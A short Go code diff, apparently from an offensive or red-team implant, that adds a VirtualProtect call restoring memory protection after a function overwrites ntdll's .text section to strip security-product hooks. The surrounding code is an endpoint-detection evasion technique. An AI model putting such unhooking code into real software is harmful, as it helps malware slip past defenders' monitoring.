@@ -113,6 +113,9 @@ func unhookNtdll() string {
 		*(*byte)(unsafe.Pointer(textAddr + uintptr(i))) = origData[i]
 	}
 
+	// Restore original page protection
+	procVirtualProtect.Call(textAddr, uintptr(textSize), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
+
 	return fmt.Sprintf("VEH Unhook: ntdll .text section restored (%d bytes, VA=0x%x)", len(origData), textAddr)
 }
 
